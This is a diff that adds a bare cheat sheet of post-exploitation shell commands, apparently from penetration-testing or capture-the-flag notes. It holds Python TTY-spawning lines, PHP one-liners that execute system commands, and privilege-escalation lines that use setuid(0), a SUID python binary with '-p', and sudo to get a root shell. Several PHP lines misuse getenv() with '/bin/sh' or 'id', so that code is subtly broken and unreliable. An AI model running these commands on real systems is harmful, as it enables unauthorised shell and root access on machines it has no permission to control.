@@ -1,0 +1,29 @@
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+export TERM=ansi
+export TERM=xterm-256color
+python3 -c 'import pty; pty.spawn("/usr/bin/bash")'
+
+export TERM=ansi
+/var/www/html/files
+php -r 'system(getenv("/bin/sh"));'
+
+
+export TERM=ansi
+
+php -r '$h=@popen(getenv("/bin/sh"),"r"); if($h){ while(!feof($h)) echo(fread($h,4096)); pclose($h); }'
+
+
+php -r '$r=array(); exec(getenv("/bin/sh"), $r); print(join("\\n",$r));'
+
+
+php -r '$p = array(array("pipe","r"),array("pipe","w"),array("pipe", "w"));$h = @proc_open(getenv("id"), $p, $pipes);if($h&&$pipes){while(!feof($pipes[1])) echo(fread($pipes[1],4096));while(!feof($pipes[2])) echo(fread($pipes[2],4096));fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($h);}'
+
+
+python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+
+./python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+
+sudo python3 -c 'import os; os.system("/bin/sh")'
